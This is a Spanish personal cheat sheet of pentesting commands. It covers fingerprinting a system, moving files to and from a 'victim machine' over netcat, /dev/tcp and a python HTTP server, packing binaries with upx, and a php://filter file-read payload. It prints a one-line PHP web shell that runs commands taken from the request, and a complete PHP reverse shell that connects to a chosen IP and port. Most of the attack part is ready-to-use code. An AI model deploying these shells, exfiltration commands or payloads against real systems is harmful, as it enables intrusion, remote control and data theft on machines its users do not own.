----------
- Tags: #tutorial #bash #terminal #comands #oneliner #info 
-------------

- ### Ver Version de SO
```bash
lsb_release -a
```

- ### Ver kernel de SO
```bash
uname -a
```


-------------------------


### Transferencia Archivos podemos Tranferirlo a la maquina victima usando:

# IMPORTANTE ESTAR EN */tmp*

- Desde nuestro equipo en escucha y ofreciendo el archivo *pspy*
```bash
nc -nlvp 443 < pspy
```

- Desde la maquina victima leemos lo que ofrece nuestra maquina (archivo pspy):
```bash
cat < /dev/tcp/192.168.3.10/443 > pspy
```

- ### Comprobar Transferencia correcta del archivo: 
```
md5sum pspy 
//Salida de comando: 88b43b16187976296c543526e1cb606f  pspy
```

Por lo cual aplicar el comando tambien en nuestra maquina para ver que el hash sea *exactamente* el mismo, lo cual significa que se tranfirio correctamente
- Por ultimo darle permismos de Ejecucion y ejecutar para ver los procesos realiados en tiempo real:

```bash
chmod +x pspy
./pspy
```


----
## Transferir INVERSO
- Desde nuestro equipo en escucha y ofreciendo el archivo *pspy
```bash
nc -nlvp 443 > archivo
```

- Desde la maquina victima leemos lo que ofrece nuestra maquina (archivo pspy):- Desde la maquina victima leemos lo que ofrece nuestra maquina (archivo pspy):
```bash
cat archivo > /dev/tcp/IP/PORT
```

---

## Metodo 2 Transferir archivo a la maquina:
```bash
//Desde nuestra maquina 
python3 -m http.server 80
```

```bash
//Desde la maquina victima
wget 192.168.3.10/nombreArchivo
//con CURL
curl 192.168.3.10/nombreArchivo -o nombreArchivo
```

------------------------

- Eliminar Interfaz Red
```bash
sudo ip link set eth0 down
sudo ip link delete eth0
```

- Aplicar Decodificacion *Root13*
```bash
echo "Tu cadena a cifrar" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

- Compilar archivo *C*
```bash
gcc source_file. c -o program_name
```

- Ver peso de un ejecutable:
```bash
du -hc <archivo>
```

- Reducir Peso sin afectar funcionalidad
```bash
upx brute <archivo>
```

- *PHP* Wrapper
```bash
php://filter/convert.base64-encode/resource=<archivo>
```


- Reverse Shell / Web Shell
```bash
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

- Monkey Pentester Shell

```bash
<?php
set_time_limit(0);
$ip = '127.0.0.1';  // CAMBIA ESTO
$port = 1234;       // CAMBIA ESTO
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = '/bin/sh -i';
$daemon = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) exit(1);
    if ($pid) exit(0);
    if (posix_setsid() == -1) exit(1);
    $daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) exit(1);

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) exit(1);

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    if (feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) fwrite($pipes[0], fread($sock, $chunk_size));
    if (in_array($pipes[1], $read_a)) fwrite($sock, fread($pipes[1], $chunk_size));
    if (in_array($pipes[2], $read_a)) fwrite($sock, fread($pipes[2], $chunk_size));
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```


### Ver puertos internos
```bash
netstat -tuln
```
